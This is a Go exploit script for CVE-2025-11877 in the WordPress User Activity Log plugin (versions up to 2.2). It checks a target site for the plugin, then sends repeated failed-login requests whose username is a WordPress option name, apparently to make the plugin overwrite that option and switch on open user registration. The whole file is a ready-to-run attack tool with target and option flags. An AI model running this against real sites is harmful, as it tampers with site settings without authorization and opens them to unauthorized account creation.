package main

import (
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const banner = `
>> [ ONLINE ]    
    ╔═══════════════════════════════════════════════════════════════════════════════════════╗
    ║   CVE-2025-11877 - User Activity Log Options Update                                   ║
    ║   Affected: User Activity Log <= 2.2                                                  ║
    ║   Author: MoritakaAz                                                                  ║
    ╚═══════════════════════════════════════════════════════════════════════════════════════╝

>> [ INFORMATION ]
`

func main() {
	targetURL := flag.String("u", "", "Target WordPress URL (required)")
	optionName := flag.String("o", "users_can_register", "WordPress option to modify")
	attempts := flag.Int("a", 1, "Number of failed login attempts")
	enableReg := flag.Bool("enable-registration", false, "Enable user registration")
	checkOnly := flag.Bool("check-only", false, "Only check if plugin is active")
	timeout := flag.Int("timeout", 30, "Request timeout in seconds")

	flag.Parse()

	fmt.Println(banner)

	if *targetURL == "" {
		fmt.Println("[-] Error: Target URL is required (-u)")
		flag.PrintDefaults()
		return
	}

	*targetURL = strings.TrimRight(*targetURL, "/")

	if *enableReg {
		*optionName = "users_can_register"
	}

	client := &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	pluginActive := checkPlugin(client, *targetURL)
	if pluginActive {
		fmt.Println("[+] Plugin detected!")
	} else {
		fmt.Println("[-] Plugin not detected (may still be active)")
	}

	if *checkOnly {
		fmt.Println("\n[*] Check-only mode, exiting...")
		return
	}

	if *enableReg {
		fmt.Println("\n============================================================")
		fmt.Println("[*] EXPLOIT: Enable User Registration")
		fmt.Println("============================================================")
	}

	fmt.Printf("\n[*] Target: %s\n", *targetURL)
	fmt.Printf("[*] Option to modify: %s\n", *optionName)
	fmt.Printf("[*] Sending %d failed login attempt(s)...\n\n", *attempts)

	successCount := 0
	for i := 1; i <= *attempts; i++ {
		fmt.Printf("[*] Attempt %d/%d: Sending failed login with username '%s'\n", i, *attempts, *optionName)

		if triggerFailedLogin(client, *targetURL, *optionName) {
			successCount++
			fmt.Println("[+] Login failure triggered successfully")
		} else {
			fmt.Println("[-] Failed to trigger login failure")
		}
		time.Sleep(300 * time.Millisecond)
	}

	fmt.Printf("\n[*] Completed %d/%d attempts\n", successCount, *attempts)

	if successCount > 0 {
		fmt.Println("\n[+] Exploitation likely successful!")
		fmt.Printf("[+] Option '%s' should now be set to: %d\n", *optionName, successCount)

		if *enableReg {
			fmt.Println("\n[+] User registration should now be ENABLED!")
			fmt.Printf("[+] Check: %s/wp-login.php?action=register\n", *targetURL)
		}
	} else {
		fmt.Println("\n[-] Exploitation may have failed")
	}

	fmt.Println("\n[*] Done.")
}

func checkPlugin(client *http.Client, targetURL string) bool {
	paths := []string{
		"/wp-content/plugins/user-activity-log/readme.txt",
		"/wp-content/plugins/user-activity-log/user_activity_log.php",
	}

	fmt.Println("[*] Checking if User Activity Log plugin is active...")

	for _, path := range paths {
		checkURL := targetURL + path
		resp, err := client.Get(checkURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			fmt.Printf("[+] Plugin detected: %s\n", path)
			return true
		}
	}
	return false
}

func triggerFailedLogin(client *http.Client, targetURL, username string) bool {
	loginURL := targetURL + "/wp-login.php"

	formData := url.Values{}
	formData.Set("log", username)
	formData.Set("pwd", "randompassword123!")
	formData.Set("wp-submit", "Log In")

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Printf("[-] Error creating request: %v\n", err)
		return false
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error sending request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200 || resp.StatusCode == 302
}
